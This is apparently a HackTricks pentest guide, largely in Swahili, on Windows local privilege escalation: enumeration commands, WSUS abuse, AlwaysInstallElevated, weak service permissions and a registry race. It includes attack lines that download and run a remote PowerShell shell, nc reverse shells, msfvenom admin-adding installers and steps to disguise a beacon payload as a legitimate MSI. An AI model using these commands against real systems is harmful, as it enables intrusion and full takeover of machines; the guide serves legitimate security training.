# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Chombo bora cha kutafuta vyanzo vya Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Initial Windows Theory

### Access Tokens

**Ikiwa haujui ni Windows Access Tokens ni nini, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Angalia ukurasa ufuatao kwa maelezo zaidi kuhusu ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Ikiwa haujui integrity levels katika Windows ni nini unapaswa kusoma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Kuna vitu mbalimbali ndani ya Windows ambavyo vinaweza **kukuzuia kuorodhesha mfumo**, kuendesha executables au hata **kugundua shughuli zako**. Unapaswa **kusoma** ukurasa ufuatao na **kuorodhesha** mifumo yote ya **ulinzi** kabla ya kuanza the privilege escalation enumeration:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess processes launched through `RAiLaunchAdminProcess` zinaweza kutumika vibaya kufikia High IL bila arifa wakati AppInfo secure-path checks zinaporuhusiwa kupitishwa. Angalia mtiririko maalum wa bypass wa UIAccess/Admin Protection hapa:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Kuenezwa kwa registry ya accessibility ya Secure Desktop kunaweza kutumiwa kwa kuandika yoyote kwenye registry ya SYSTEM (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

## System Info

### Version info enumeration

Angalia kama toleo la Windows lina udhaifu unaojulikana (angalia pia patches zilizowekwa).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Exploits za Toleo

Tovuti hii [site](https://msrc.microsoft.com/update-guide/vulnerability) ni muhimu kwa kutafuta taarifa za kina kuhusu udhaifu wa usalama wa Microsoft. Hifadhidata hii ina zaidi ya udhaifu 4,700 wa usalama, ikionyesha **uso mkubwa wa mashambulizi** ambao mazingira ya Windows yanatoa.

**Kwenye mfumo**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Lokali kwa taarifa za mfumo**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Ma-repo ya GitHub ya exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Mazingira

Je, kuna credential/Juicy info iliyohifadhiwa katika env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Historia ya PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Faili za PowerShell Transcript

Unaweza kujifunza jinsi ya kuiwasha katika [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Maelezo ya utekelezaji wa pipeline za PowerShell yanarekodiwa, ikiwa ni pamoja na amri zilizotekelezwa, miito ya amri, na sehemu za scripts. Hata hivyo, maelezo kamili ya utekelezaji na matokeo ya output yanaweza kutokamatwa.

Ili kuziwezesha, fuata maagizo kwenye sehemu ya "Transcript files" ya nyaraka, ukichagua **"Module Logging"** badala ya **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Ili kuangalia matukio 15 ya mwisho kutoka kwenye logi za PowersShell, unaweza kutekeleza:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Rekodi kamili ya shughuli na yaliyomo yote ya utekelezaji wa script inarekodiwa, ikihakikishia kwamba kila block of code inaandikwa wakati inavyotekelezwa. Mchakato huu unahifadhi audit trail kamili ya kila shughuli, muhimu kwa forensiki na kwa uchambuzi wa tabia hatarishi. Kwa kurekodi shughuli zote wakati wa utekelezaji, panapatikana ufahamu wa kina kuhusu mchakato.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Matukio ya kurekodi ya Script Block yanaweza kupatikana ndani ya Windows Event Viewer katika njia: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Ili kuona matukio 20 za mwisho unaweza kutumia:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Mipangilio ya Intaneti
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Diski
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Unaweza kupata udhibiti wa mfumo ikiwa sasisho hayaombwi kwa kutumia http**S** bali http.

Unaanza kwa kukagua ikiwa mtandao unatumia sasisho za WSUS zisizo na SSL kwa kuendesha yafuatayo kwenye cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Au yafuatayo katika PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Ikiwa utapokea jibu kama mojawapo ya haya:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Na ikiwa `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` au `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ni sawa na `1`.

Basi, **inaweza kutumiwa.** Ikiwa registry ya mwisho ni sawa na `0`, basi, entry ya WSUS itatengwa.

Ili kutumia udhaifu huu unaweza kutumia zana kama: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Hizi ni scripts za MiTM zilizofanyizwa silaha ili kuingiza 'fake' updates katika trafiki ya WSUS isiyo-SSL.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Kwa kifupi, hili ndilo hitilafu ambayo mdudu huu unaitumia:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

Unaweza kutumia udhaifu huu kwa kutumia chombo [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (mara itakapokuwa imetolewa).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Wakala wengi wa ki-enterprise huweka uso wa localhost IPC na chaneli ya update yenye ruhusa za juu. Ikiwa enrollment inaweza kulazimishwa kuelekea server ya mshambuliaji na updater itamwamini rogue root CA au ukaguzi dhaifu wa signer, mtumiaji wa ndani anaweza kuwasilisha MSI mbaya ambayo huduma ya SYSTEM itainstal. Angalia mbinu iliyojumuishwa (iliyotegemea mnyororo wa Netskope stAgentSvc – CVE-2025-0309) hapa:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` inaweka huduma ya localhost kwenye **TCP/9401** ambayo inachakata ujumbe unaodhibitiwa na mshambuliaji, kuruhusu amri zozote kama **NT AUTHORITY\SYSTEM**.

- **Recon**: thibitisha listener na toleo, kwa mfano, `netstat -ano | findstr 9401` na `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: weka PoC kama `VeeamHax.exe` pamoja na Veeam DLLs zinazohitajika katika saraka ile ile, kisha kusababisha payload ya SYSTEM kupitia socket ya localhost:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Huduma inatekeleza amri kama SYSTEM.
## KrbRelayUp

Kuna udhaifu wa **local privilege escalation** katika mazingira ya Windows **domain** chini ya masharti maalum. Masharti haya ni pamoja na mazingira ambapo **LDAP signing is not enforced,** watumiaji wana self-rights zinazowaruhusu kusanidi **Resource-Based Constrained Delegation (RBCD),** na uwezo wa watumiaji kuunda kompyuta ndani ya domain. Ni muhimu kutambua kwamba haya **mahitaji** yanatimizwa kwa kutumia **mipangilio ya chaguo-msingi**.

Pata **exploit** katika [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Kwa taarifa zaidi kuhusu mtiririko wa attack angalia [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Ikiwa** rejista hizi 2 **zimewezeshwa** (thamani ni **0x1**), basi watumiaji wa cheo chochote wanaweza **sakinisha** (kutekeleza) `*.msi` files kama NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Iwapo una kikao cha meterpreter, unaweza kuendesha mbinu hii kwa otomatiki ukitumia module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Tumia amri ya `Write-UserAddMSI` kutoka power-up kuunda ndani ya saraka ya sasa binary ya Windows MSI ili kuinua vibali. Script hii inaandika MSI installer iliyotayarishwa mapema inayouliza kuongeza user/group (kwa hiyo utahitaji ufikiaji wa GUI):
```
Write-UserAddMSI
```
Tu execute the created binary to escalate privileges.

### MSI Wrapper

Soma tutorial hii ili ujifunze jinsi ya kuunda MSI wrapper kwa kutumia tools hizi. Kumbuka kuwa unaweza kuzungusha faili "**.bat**" ikiwa unataka **just** **execute** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Fungua **Visual Studio**, chagua **Create a new project** na andika "installer" kwenye kisanduku cha utafutaji. Chagua mradi wa **Setup Wizard** na bonyeza **Next**.
- Toa mradi jina, kwa mfano **AlwaysPrivesc**, tumia **`C:\privesc`** kwa eneo, chagua **place solution and project in the same directory**, na bonyeza **Create**.
- Endelea kubofya **Next** mpaka ufike hatua ya 3 ya 4 (choose files to include). Bonyeza **Add** na chagua Beacon payload uliyotengeneza. Kisha bonyeza **Finish**.
- Chagua mradi **AlwaysPrivesc** katika **Solution Explorer** na katika **Properties**, badilisha **TargetPlatform** kutoka **x86** hadi **x64**.
- Kuna properties nyingine unaweza kubadilisha, kama **Author** na **Manufacturer** ambazo zinaweza kufanya app iliyosakinishwa ionekane halali zaidi.
- Bofya-kulia mradi na chagua **View > Custom Actions**.
- Bofya-kulia **Install** na chagua **Add Custom Action**.
- Bonyeza mara mbili kwenye **Application Folder**, chagua faili yako **beacon.exe** na bonyeza **OK**. Hii itahakikisha kuwa beacon payload inatekelezwa mara installer inapofanyika.
- Chini ya **Custom Action Properties**, badilisha **Run64Bit** kuwa **True**.
- Mwisho, **build it**.
- Ikiwa onyo `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` linaonekana, hakikisha umeweka platform kuwa x64.

### MSI Installation

Ili execute the **installation** ya faili `.msi` yenye madhara kwa **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Ili kuitumia udhaifu huu unaweza kutumia: _exploit/windows/local/always_install_elevated_

## Antivirus na Vigunduzi

### Mipangilio ya Ukaguzi

Mipangilio hii inaamua ni nini kinacho **andikwa**, kwa hivyo unapaswa kuzingatia
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, inavutia kujua wapi logs zinatumwa
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** imeundwa kwa ajili ya **usimamizi wa local Administrator passwords**, kuhakikisha kila password ni **ya kipekee, ya nasibu, na inasasishwa mara kwa mara** kwenye kompyuta zilizojiunga na domain. Password hizi zinahifadhiwa kwa usalama ndani ya Active Directory na zinaweza kufikiwa tu na watumiaji waliopewa ruhusa za kutosha kupitia ACLs, kuwaruhusu kuona local admin passwords ikiwa wameidhinishwa.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ikiwa inafanya kazi, **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**Taarifa zaidi kuhusu WDigest kwenye ukurasa huu**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Kuanzia **Windows 8.1**, Microsoft ilianzisha ulinzi ulioboreshwa kwa Local Security Authority (LSA) ili **kuzuia** jaribio la michakato isiyoaminika **kusoma kumbukumbu yake** au kuingiza msimbo, ikifanya mfumo kuwa salama zaidi.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** ilianzishwa katika **Windows 10**. Lengo lake ni kulinda credentials zilizohifadhiwa kwenye kifaa dhidi ya vitisho kama pass-the-hash attacks.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** zinathibitishwa na **Local Security Authority** (LSA) na zinatumika na vipengele vya mfumo wa uendeshaji. Wakati logon data ya mtumiaji inathibitishwa na registered security package, domain credentials za mtumiaji kwa kawaida huanzishwa.\
[**Taarifa zaidi kuhusu Cached Credentials hapa**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Watumiaji na Vikundi

### Orodhesha Watumiaji na Vikundi

Unapaswa kuangalia kama kuna vikundi uliyomo vina ruhusa zinazovutia
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Makundi yenye mamlaka

Kama wewe **ni mwanachama wa kundi fulani lenye mamlaka, huenda ukaweza kupata ruhusa za juu**. Jifunze kuhusu makundi yenye mamlaka na jinsi ya kuyatumia vibaya ili kupata ruhusa za juu hapa:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Uendeshaji wa token

**Jifunze zaidi** kuhusu ni nini **token** katika ukurasa huu: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Angalia ukurasa ufuatao ili **ujifunze kuhusu tokens za kuvutia** na jinsi ya kuzitumia vibaya:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Watumiaji walioingia / Vikao
```bash
qwinsta
klist sessions
```
### Folda za nyumbani
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Sera ya Nywila
```bash
net accounts
```
### Pata yaliyomo kwenye clipboard
```bash
powershell -command "Get-Clipboard"
```
## Mchakato Zinazokimbia

### Idhini za Faili na Folda

Kwanza kabisa, wakati wa kuorodhesha processes **angalia nywila ndani ya command line ya process**.\
Angalia kama unaweza **kuandika juu ya binary inayokimbia** au kama una write permissions kwenye folda ya binary ili kujaribu [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Daima angalia uwezekano wa [**electron/cef/chromium debuggers** zinaendesha, unaweza kuzitumia vibaya kuinua vibali](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Kuangalia ruhusa za binaries za michakato**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Kukagua ruhusa za folda zinazohifadhi binaries za mchakato (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Uchimbaji wa Password ya Kumbukumbu

Unaweza kutengeneza dump ya kumbukumbu ya mchakato unaoendesha kwa kutumia **procdump** kutoka sysinternals. Huduma kama FTP zina **credentials in clear text in memory**. Jaribu kufanya dump ya kumbukumbu na kusoma credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Programu za GUI zisizo salama

**Programu zinazoendesha kama SYSTEM zinaweza kumruhusu mtumiaji kufungua CMD, au kuvinjari saraka.**

Mfano: "Windows Help and Support" (Windows + F1), tafuta "command prompt", bonyeza "Click to open Command Prompt"

## Huduma

Service Triggers zinamwezesha Windows kuanza service wakati masharti fulani yanapotokea (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Hata bila haki za SERVICE_START, mara nyingi unaweza kuanza services zenye ruhusa kwa kuzindua triggers zao. Angalia mbinu za enumeration na activation hapa:

-
{{#ref}}
service-triggers.md
{{#endref}}

Pata orodha ya services:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Ruhusa

Unaweza kutumia **sc** kupata taarifa kuhusu huduma
```bash
sc qc <service_name>
```
Inashauriwa kuwa na binary **accesschk** kutoka _Sysinternals_ ili kukagua kiwango kinachohitajika cha ruhusa kwa kila huduma.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Inapendekezwa kuangalia ikiwa "Authenticated Users" wanaweza kubadilisha huduma yoyote:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Wezesha huduma

Ikiwa unapata hitilafu hii (kwa mfano na SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Unaweza kuiwezesha kwa kutumia
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Kumbuka kwamba huduma upnphost inategemea SSDPSRV ili ifanye kazi (kwa XP SP1)**

**Njia mbadala nyingine** ya tatizo hili ni kuendesha:
```
sc.exe config usosvc start= auto
```
### **Badilisha njia ya binary ya huduma**

Katika hali ambapo kundi la "Authenticated users" lina **SERVICE_ALL_ACCESS** kwenye huduma, inawezekana kubadilisha binary inayotekelezwa ya huduma. Ili kubadilisha na kuendesha **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Anzisha upya huduma
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privileges can be escalated through various permissions:

- **SERVICE_CHANGE_CONFIG**: Inaruhusu kurekebisha service binary.
- **WRITE_DAC**: Inawezesha kurekebisha idhini, na hivyo kutoa uwezo wa kubadilisha mipangilio ya service.
- **WRITE_OWNER**: Inaruhusu upokeaji wa umiliki na kurekebisha idhini.
- **GENERIC_WRITE**: Inarithi uwezo wa kubadilisha mipangilio ya service.
- **GENERIC_ALL**: Pia inarithi uwezo wa kubadilisha mipangilio ya service.

For the detection and exploitation of this vulnerability, the _exploit/windows/local/service_permissions_ can be utilized.

### Ruhusa dhaifu za binaries za Services

**Angalia ikiwa unaweza kubadilisha binary inayotekelezwa na service** au ikiwa una **idhini za kuandika kwenye folder** ambapo binary iko ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Unaweza kupata kila binary inayotekelezwa na service kwa kutumia **wmic** (not in system32) na ukague idhini zako kwa kutumia **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Unaweza pia kutumia **sc** na **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Ruhusa za kubadilisha rejista ya huduma

Unapaswa kuangalia kama unaweza kubadilisha rejista yoyote ya huduma.\
Unaweza **kuangalia** **ruhusa** zako juu ya **rejista** ya huduma kwa kufanya:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Inapaswa kukaguliwa ikiwa **Authenticated Users** au **NT AUTHORITY\INTERACTIVE** wana `FullControl` ruhusa. Ikiwa ndio, binary inayotekelezwa na service inaweza kubadilishwa.

Ili kubadilisha Path ya binary inayotekelezwa:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Baadhi ya vipengele vya Windows Accessibility huunda funguo za per-user **ATConfig** ambazo baadaye zinakopiwa na mchakato wa **SYSTEM** ndani ya funguo ya kikao ya HKLM. Registry **symbolic link race** inaweza kuelekeza tena uandishi huo yenye mamlaka kwenda kwenye **njia yoyote ya HKLM**, ikitoa arbitrary HKLM **value write** primitive.

Key locations (example: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` huorodhesha vipengele vya Accessibility vilivyowekwa.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` inahifadhi usanidi unaodhibitiwa na mtumiaji.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` inaundwa wakati wa logon/secure-desktop transitions na inaweza kuandikwa na mtumiaji.

Abuse flow (CVE-2026-24291 / ATConfig):

1. Jaza thamani ya **HKCU ATConfig** unayotaka iandikwe na SYSTEM.
2. Sababisha nakala ya secure-desktop (mfano, **LockWorkstation**), ambayo inaanza mtiririko wa AT broker.
3. **Win the race** kwa kuweka **oplock** kwenye `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; wakati oplock itakapofanyika, badilisha funguo ya **HKLM Session ATConfig** kwa **registry link** kuelekea kwenye lengo la HKLM lililolindwa.
4. SYSTEM itaandika thamani iliyochaguliwa na mshambuliaji kwenye njia ya HKLM iliyokelekezwa.

Mara unapopata arbitrary HKLM value write, punguza hadi LPE kwa kuandika upya thamani za usanidi za service:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Chagua service ambayo mtumiaji wa kawaida anaweza kuanza (mfano, **`msiserver`**) na ianzishe baada ya kuandika. **Kumbuka:** utekelezaji wa public exploit **hufunga workstation** kama sehemu ya race.

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

Ikiwa una ruhusa hii juu ya registry, hii inamaanisha **unaweza kuunda sub registries kutoka hii moja**. Katika kesi ya Windows services, hii ni **ya kutosha kutekeleza arbitrary code:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Ikiwa njia ya executable haiko ndani ya nukuu, Windows itajaribu kutekeleza kila sehemu kabla ya nafasi.

Kwa mfano, kwa njia _C:\Program Files\Some Folder\Service.exe_ Windows itajaribu kutekeleza:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
